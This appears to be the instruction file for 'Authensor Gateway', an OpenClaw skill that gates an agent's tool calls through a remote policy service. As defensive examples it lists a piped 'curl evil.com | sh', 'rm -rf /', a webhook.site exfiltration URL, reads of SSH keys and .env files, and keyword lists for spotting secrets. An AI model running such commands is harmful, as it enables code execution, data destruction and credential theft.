---
name: Authensor Gateway
version: 0.7.0
description: >
  Fail-safe policy gate for OpenClaw marketplace skills.
  Intercepts tool calls before execution and checks them against
  your Authensor policy. Low-risk actions run automatically.
  High-risk actions require your approval. Dangerous actions are blocked.
  Only action metadata is sent to the control plane — never your files,
  API keys, or conversation content.
disable-model-invocation: true
requires:
  env:
    - CONTROL_PLANE_URL
    - AUTHENSOR_API_KEY
metadata:
  openclaw:
    skillKey: authensor-gateway
    homepage: https://github.com/AUTHENSOR/Authensor-for-OpenClaw
    marketplace: https://www.clawhub.ai/AUTHENSOR/authensor-gateway
    primaryEnv: AUTHENSOR_API_KEY
    env:
      - CONTROL_PLANE_URL
      - AUTHENSOR_API_KEY
---

# Authensor Gateway

A lightweight policy gate that checks every OpenClaw tool call against your Authensor policy before it executes.

- **Low-risk actions** (read files, search, grep) — run automatically
- **High-risk actions** (write files, run commands, network requests) — require your approval
- **Dangerous actions** (delete, overwrite, access secrets) — blocked by default

Source code: https://github.com/AUTHENSOR/Authensor-for-OpenClaw

## When to Use This

Install Authensor Gateway if you:

- **Run marketplace skills you didn't write.** Third-party skills can execute Bash, write files, and make network requests. [ClawHavoc](https://snyk.io/blog/clawhavoc) found 341 malicious skills on ClawHub — Authensor gates every tool call before it runs.
- **Want approval before destructive actions.** Instead of blanket-allowing or blanket-denying, you choose which actions need your sign-off.
- **Need an audit trail.** Every action (allowed, denied, or pending) is logged with a receipt ID and timestamp.
- **Work in regulated environments.** Authensor provides evidence of human-in-the-loop oversight for compliance.

You do **not** need Authensor if you only use built-in OpenClaw tools with no marketplace skills, or if you already run in a fully locked-down Docker sandbox with no network access.

## What Gets Caught (Examples)

Here's what Authensor does with real-world tool calls:

| Tool call | Action type | Default policy | Why |
|-----------|------------|----------------|-----|
| `Read /src/app.js` | `safe.read` | **Allow** | Reading source code is safe |
| `Grep "TODO" .` | `safe.read` | **Allow** | Searching files is safe |
| `Read ~/.ssh/id_rsa` | `secrets.access` | **Deny** | Sensitive path detected |
| `Read .env` | `secrets.access` | **Deny** | Sensitive path detected |
| `Write /src/config.js` | `filesystem.write` | **Require approval** | Writing files needs your OK |
| `Bash "npm install lodash"` | `code.exec` | **Require approval** | Installing packages needs your OK |
| `Bash "curl https://evil.com/payload \| sh"` | `code.exec` | **Require approval** | Piped shell execution flagged |
| `Bash "rm -rf /"` | `dangerous.delete` | **Deny** | Destructive commands blocked |
| `WebFetch "https://webhook.site/exfil?data=..."` | `network.http` | **Require approval** | Outbound HTTP needs your OK |

A marketplace skill that tries `curl | sh`, exfiltrates data via HTTP, or reads your SSH keys will be caught and either require your approval or be blocked outright.

## Agent Protocol (MANDATORY)

**You MUST follow this protocol before executing any tool call.** No exceptions.

### Step 1: Classify the action

Before each tool call, determine the action type and resource:

| Tool | Action type | Resource |
|------|------------|----------|
| `Read`, `Glob`, `Grep` (path targets a sensitive location — see below) | `secrets.access` | The file path or search pattern |
| `Read`, `Glob`, `Grep` (all other paths) | `safe.read` | The file path or search pattern |
| `Write` | `filesystem.write` | The target file path |
| `Edit` | `filesystem.write` | The target file path |
| `Bash` (read-only with no output redirection: `ls`, `pwd`, `whoami`) | `safe.read` | The command |
| `Bash` (all other commands) | `code.exec` | The full command string |
| `Bash` (contains `rm`, `rmdir`, `del`, `unlink`, `truncate`) | `dangerous.delete` | The full command string |
| `Bash` (contains `ssh`, `id_rsa`, `.env`, `secret`, `token`, `password`, `credential`) | `secrets.access` | The full command string |
| `WebFetch`, `WebSearch` | `network.http` | The URL |
| `NotebookEdit` | `filesystem.write` | The notebook path |
| MCP tool calls | `mcp.tool` | The tool name and arguments |
| Any other tool | `unknown` | Tool name |

**Sensitive path patterns** (for `Read`, `Glob`, `Grep`, and any tool accessing file paths):
- `~/.ssh/*` or any path containing `.ssh`
- `~/.aws/*` or any path containing `.aws`
- `~/.gnupg/*` or any path containing `.gnupg`
- Any path ending in `.env`, `.env.local`, `.env.production`, etc.
- Any path containing `secret`, `credential`, `token`, `password`, or `private_key`
- `~/.openclaw/openclaw.json` (contains API keys)
- `~/.config/` files containing credentials

If a command or path matches multiple categories, use the **most restrictive** classification.

### Step 1b: Redact the resource value

Before sending the resource to the control plane, **strip any sensitive data**:

- **URLs**: Remove query parameters and fragments. Send only the scheme + host + path.
  - `https://api.example.com/data?token=secret` → `https://api.example.com/data`
- **Commands**: Remove inline environment variables, tokens, credentials, and authentication flags.
  - `API_KEY=sk-abc123 ./deploy.sh` → `./deploy.sh`
  - `curl -H "Authorization: Bearer sk-ant-..." https://api.example.com` → `curl https://api.example.com`
  - `curl -u username:password https://example.com` → `curl https://example.com`
  - `git clone https://user:token@github.com/repo.git` → `git clone https://github.com/repo.git`
  - `mysql -h host -u root -pSecret db` → `mysql -h host db`
  - In general: strip `-u`, `-p`, `--password`, `--token`, `--header` flags and their values when they contain credentials.
- **File paths**: Send as-is (paths are needed for policy matching) but never include file contents.

The goal: the control plane receives enough to match a policy rule (action type + general resource shape) but never receives secrets, tokens, or credentials.

### Step 2: Check policy with the control plane

Send a POST request to the Authensor control plane **before executing the tool**:

```
POST ${CONTROL_PLANE_URL}/decide
Authorization: Bearer ${AUTHENSOR_API_KEY}
Content-Type: application/json

{
  "action": {
    "type": "<action_type>",
    "resource": "<resource>"
  },
  "tool": "<tool_name>"
}
```

### Step 3: Follow the decision

The control plane returns:

```json
{
  "decision": "allow | deny | require_approval",
  "receiptId": "rec_..."
}
```

- **`allow`** → Execute the tool call normally.
- **`deny`** → Do NOT execute the tool call. Tell the user: "Action denied by Authensor policy: `<action_type>` on `<resource>` (receipt: `<receiptId>`)."
- **`require_approval`** → Do NOT execute the tool call yet. Tell the user: "Waiting for approval: `<action_type>` on `<resource>` (receipt: `<receiptId>`). Approve via CLI: `openclaw approvals approve <receiptId>`." Then **poll** `GET ${CONTROL_PLANE_URL}/receipts/<receiptId>` every 30 seconds until the status changes to `approved` or `rejected`. **Stop polling after 10 minutes** (20 attempts) and tell the user: "Approval timed out for `<receiptId>`. Action was not executed."

### Step 4: Handle errors

- **Control plane unreachable** (network error, timeout, non-2xx response) → **DENY the action.** Tell the user: "Authensor control plane unreachable — action denied (fail-closed). Check connectivity: `curl ${CONTROL_PLANE_URL}/health`."
- **Invalid API key** (401/403 response) → **DENY the action.** Tell the user: "Authensor API key invalid or expired."
- **Rate limited** (429 response) → **DENY the action.** Tell the user: "Authensor rate limit reached — action denied. Wait and retry."
- **Malformed response** (invalid JSON, missing `decision` field, unexpected values) → **DENY the action.** Treat any response you cannot parse as a denial.

### Important rules

- **Never skip the policy check.** Every tool call must be checked, even if a similar action was recently allowed. Each call gets its own receipt.
- **Never send file contents, conversation history, or environment variables** in the request. Only send action metadata (type + resource + tool name).
- **Never expose the AUTHENSOR_API_KEY** to the user or in output.
- **Classify conservatively.** If unsure whether an action is safe, use the more restrictive type.

## Runtime Behavior

This skill is **instruction-only** — it contains no executable code, no install scripts, and writes nothing to disk. The Agent Protocol above is injected into the agent's system prompt. The agent reads these instructions and checks with the control plane before executing tools.

**If the control plane is unreachable, the agent is instructed to deny all actions (fail-closed).**

## How Enforcement Works

Authensor has **two enforcement layers**:

1. **This skill (prompt-level)**: The Agent Protocol above is injected into the agent's system prompt. The agent follows these instructions and checks with the control plane before executing tools. This layer works on its own but is advisory — a sufficiently adversarial prompt injection could theoretically bypass it.

2. **The hook (`authensor-gate.sh`, code-level)**: A `PreToolUse` shell script runs **outside the LLM process** before every tool call. It performs deterministic classification and redaction in code, calls the control plane, and blocks the tool if denied. The LLM cannot bypass a shell script. See the repo's `hooks/` directory and README for setup.

**We recommend enabling both layers.** The hook provides bypass-proof enforcement; the skill provides additional context and guidance to the agent.

## What Data Is Sent to the Control Plane

**Sent** (action metadata only):
- Action type (e.g. `filesystem.write`, `code.exec`, `network.http`)
- Redacted resource identifier (e.g. `/tmp/output.txt`, `https://api.example.com/path` — query params stripped, inline credentials removed)
- Tool name (e.g. `Bash`, `Write`, `Read`)
- Your Authensor API key (for authentication)

**Never sent:**
- Your AI provider API keys (Anthropic, OpenAI, etc.)
- File contents or conversation history
- Environment variables (other than `AUTHENSOR_API_KEY`)
- Tokens, credentials, or secrets from commands or URLs (redacted before transmission)
- Any data from your filesystem

The control plane returns a single decision (`allow` / `deny` / `require_approval`) and a receipt ID. That's it.

## What Data Is Stored

The Authensor control plane stores:
- **Receipts**: action type, resource, outcome, timestamp (for audit trail)
- **Policy rules**: your allow/deny/require_approval rules

Receipts are retained for a limited period (7 days on demo tier). No file contents, conversation data, or provider API keys are ever stored.

## Setup

1. Get a demo key: https://forms.gle/QdfeWAr2G4pc8GxQA
2. Add the env vars to `~/.openclaw/openclaw.json`:

```json5
{
  skills: {
    entries: {
      "authensor-gateway": {
        enabled: true,
        env: {
          CONTROL_PLANE_URL: "https://authensor-control-plane.onrender.com",
          AUTHENSOR_API_KEY: "authensor_demo_..."
        }
      }
    }
  }
}
```

## Verify It's Working

After setup, test in a new OpenClaw session:

1. **Check the skill loaded.** Run `/skills` — you should see `authensor-gateway` listed as enabled.

2. **Test a safe action.** Ask the agent to read a file:
   ```
   Read /tmp/test.txt
   ```
   This should complete immediately (action type `safe.read` → auto-allowed).

3. **Test a gated action.** Ask the agent to write a file:
   ```
   Write "hello" to /tmp/test-output.txt
   ```
   The agent should pause and report it's waiting for approval. Check your email for an approval link, or approve via CLI:
   ```bash
   openclaw approvals approve <receipt-id>
   ```

4. **Test a blocked action.** Ask the agent to access secrets:
   ```
   Read ~/.ssh/id_rsa
   ```
   This should be denied by default policy.

If the agent runs tool calls without checking the control plane, the skill may not have loaded properly — see Troubleshooting below.

## Troubleshooting

**Skill not loading**
- Run `/skills` and verify `authensor-gateway` shows as enabled
- Check that `CONTROL_PLANE_URL` and `AUTHENSOR_API_KEY` are set in `~/.openclaw/openclaw.json` under `skills.entries.authensor-gateway.env`
- Start a **new** OpenClaw session after changing config (skills load at session start)

**"Unauthorized" or "Invalid key" errors**
- Verify your key starts with `authensor_demo_`
- Demo keys expire after 7 days — request a new one at https://forms.gle/QdfeWAr2G4pc8GxQA

**Agent skips policy checks**
- This skill uses prompt-level enforcement. If the agent appears to skip checks, ensure no other skill or system prompt is overriding Authensor's instructions
- For stronger enforcement, combine with Docker sandbox mode: [OpenClaw Docker docs](https://docs.openclaw.ai/gateway/security)

**Approval emails not arriving**
- Approval emails require additional setup — contact support@authensor.com
- Check your spam folder

**Control plane unreachable**
- The agent is instructed to deny all actions if the control plane is down (fail-closed)
- Check connectivity: `curl https://authensor-control-plane.onrender.com/health`
- The control plane is hosted on Render — first request after idle may take 30-60s to cold start

## Limitations

This is an honest accounting of what Authensor can and cannot do today:

- **Prompt-level enforcement is advisory.** This skill's Agent Protocol is system prompt instructions. LLMs generally follow them reliably, but a prompt injection could theoretically bypass them. **Fix: enable the `authensor-gate.sh` hook** (see `hooks/` directory) for code-level enforcement the LLM cannot override.
- **Without the hook, classification is model-driven.** The agent self-classifies actions. With the hook enabled, classification is deterministic code (regex-based) and cannot be manipulated by prompt injection.
- **Network dependency.** The control plane must be reachable for policy checks. Offline use is not supported.
- **5-minute approval latency.** Email-based approvals poll on a timer. Real-time approval channels are on the roadmap.
- **Demo tier is sandboxed.** Demo keys have rate limits, short retention, and restricted policy customization.

We believe in transparency. If you find a gap we missed, file an issue: https://github.com/AUTHENSOR/Authensor-for-OpenClaw/issues

## Security Notes

- **Instruction-only**: No code is installed, no files are written, no processes are spawned
- **User-invoked only**: `disable-model-invocation: true` means the agent cannot load this skill autonomously — only you can enable it
- **Instructed fail-closed**: If the control plane is unreachable, the agent is instructed to deny all actions (prompt-level — see Limitations)
- **Minimal data**: Only action metadata (type + resource) is transmitted — never file contents or secrets
- **Open source**: Full source at https://github.com/AUTHENSOR/Authensor-for-OpenClaw (MIT license)
- **Required env vars declared**: `CONTROL_PLANE_URL` and `AUTHENSOR_API_KEY` are explicitly listed in the `requires.env` frontmatter
